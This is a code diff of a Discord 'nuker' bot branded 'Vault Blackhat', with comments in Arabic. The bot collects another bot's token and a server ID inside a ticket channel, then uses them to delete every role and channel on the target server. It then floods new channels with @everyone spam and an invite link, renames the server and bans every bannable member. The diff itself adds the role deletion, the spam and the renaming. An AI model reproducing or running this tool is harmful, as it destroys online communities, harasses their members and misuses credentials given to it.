@@ -1,9 +1,8 @@
 const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, ChannelType } = require('discord.js');
 const http = require('http');
 
-const TOKEN = process.env.TOKEN;
+const TOKEN = process.env.TOKEN; // تأكد إنك حاطط التوكن هنا أو بالـ Environment
 
-// البوت الأساسي اللي بيفتح التكتات
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
@@ -17,14 +16,14 @@ client.once('ready', () => {
     console.log(`[+] Vault Nuker is online: ${client.user.tag}`);
 });
 
-// خزن بيانات التكتات مؤقتاً
 const ticketsData = new Map();
 
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
-    // 1. فتح التكت
     const content = message.content.toLowerCase().trim();
+    
+    // 1. فتح التكت
     if (content === 'جحفلة' || content === 'nuke') {
         await message.reply("⏳ جاري فتح تكت الجحفلة...").catch(()=>{});
 
@@ -43,7 +42,7 @@ client.on('messageCreate', async (message) => {
 
             const embed = new EmbedBuilder()
                 .setAuthor({ name: `@${user.username} Welcome`, iconURL: user.displayAvatarURL() })
-                .setDescription("أهلاً بك في تكت **الجحفلة**.\n\nيرجى وضع **توكن البوت** و **ايدي السيرفر** في الاسفل (اكتبهم كرسالة عادية)، وسيتم فحص البوت. بعدها اختر نوع التخريب:")
+                .setDescription("أهلاً بك في تكت **الجحفلة**.\n\n1. ضع **توكن البوت** (رسالة لحالها)\n2. ضع **ايدي السيرفر** (رسالة لحالها)\n\nبعدها اختر نوع التخريب:")
                 .setColor(0xFF0000)
                 .setFooter({ text: 'Vault Blackhat' });
 
@@ -55,7 +54,6 @@ client.on('messageCreate', async (message) => {
 
             await ticketChannel.send({ content: `${user}`, embeds: [embed], components: [actionRow] });
 
-            // نسجل إنه هاد تكت جحفلة
             ticketsData.set(ticketChannel.id, { userId: user.id, token: null, guildId: null });
 
         } catch (error) {
@@ -65,25 +63,22 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // 2. قراءة التوكن والايدي داخل التكت
+    // 2. قراءة التوكن والايدي
     if (ticketsData.has(message.channel.id)) {
         const data = ticketsData.get(message.channel.id);
         
-        // إذا الرسالة فيها توكن (طويلة وفيها نقط)
         if (message.content.length > 50 && message.content.includes('.')) {
             data.token = message.content.trim();
-            await message.reply("✅ تم استلام التوكن.");
+            await message.reply("✅ تم استلام التوكن. (يرجى وضع الايدي الان)");
         } 
-        // إذا الرسالة أرقام (ايدي السيرفر)
         else if (/^\d{17,20}$/.test(message.content.trim())) {
             data.guildId = message.content.trim();
-            await message.reply("✅ تم استلام ايدي السيرفر.");
+            await message.reply("✅ تم استلام ايدي السيرفر. (اضغط على الزر الان)");
         }
         ticketsData.set(message.channel.id, data);
     }
 });
 
-// الهاندلر للأزرار
 client.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isButton()) return;
     
@@ -95,14 +90,12 @@ client.on(Events.InteractionCreate, async (interaction) => {
         return;
     }
 
-    // التحقق من البيانات
     if (!data || !data.token || !data.guildId) {
         return interaction.reply({ content: '❌ يرجى إرسال توكن البوت وايدي السيرفر أولاً في الشات!', ephemeral: true });
     }
 
     await interaction.reply({ content: '⏳ جاري الاتصال بالبوت...', ephemeral: true });
 
-    // إنشاء بوت جديد بالتوكن اللي دخلوا العضو
     const nukeClient = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
 
     try {
@@ -114,11 +107,32 @@ client.on(Events.InteractionCreate, async (interaction) => {
         }
 
         if (interaction.customId === 'action_delete_channels') {
-            await interaction.editReply({ content: '🗑️ جاري حذف الرومات...' });
+            await interaction.editReply({ content: '🗑️ جاري الجحفلة...' });
+            
+            // حذف الرتب
+            for (const role of targetGuild.roles.cache.values()) {
+                if (role.name !== '@everyone' && !role.managed && role.id !== targetGuild.members.me.roles.highest.id) {
+                    await role.delete().catch(()=>{});
+                }
+            }
+
+            // حذف القنوات
             for (const channel of targetGuild.channels.cache.values()) {
                 await channel.delete().catch(()=>{});
             }
-            await interaction.editReply({ content: '✅ تم حذف كل الرومات.' });
+
+            // سبام
+            for (let i = 0; i < 10; i++) {
+                const newChannel = await targetGuild.channels.create({ name: 'nuked-by-hero-ninja', type: ChannelType.GuildText }).catch(()=>null);
+                if (newChannel) {
+                    for (let j = 0; j < 5; j++) {
+                        await newChannel.send("@everyone **تم الجحفلة بواسطة HeRo - Ninja** 💀\n\nhttps://discord.gg/197").catch(()=>{});
+                    }
+                }
+            }
+
+            await targetGuild.setName('جحفلة HeRo - Ninja').catch(()=>{});
+            await interaction.editReply({ content: '✅ تم الجحفلة بنجاح.' });
         }
 
         if (interaction.customId === 'action_ban_all') {
@@ -126,17 +140,17 @@ client.on(Events.InteractionCreate, async (interaction) => {
             const members = await targetGuild.members.fetch();
             for (const member of members.values()) {
                 if (member.id !== nukeClient.user.id && member.bannable) {
-                    await member.ban({ reason: 'Nuke' }).catch(()=>{});
+                    await member.ban({ reason: 'Nuke by HeRo - Ninja' }).catch(()=>{});
                 }
             }
             await interaction.editReply({ content: '✅ تم باند الأعضاء.' });
         }
 
-        await nukeClient.destroy(); // نسكّر الاتصال بعد ما نخلص
+        await nukeClient.destroy();
 
     } catch (err) {
         console.error(err);
-        await interaction.editReply({ content: '❌ التوكن غلط أو البوت ما عنده صلاحيات.' });
+        await interaction.editReply({ content: '❌ التوكن غلط، أو البوت ما عنده Administrator بالسيرفر.' });
     }
 });
 
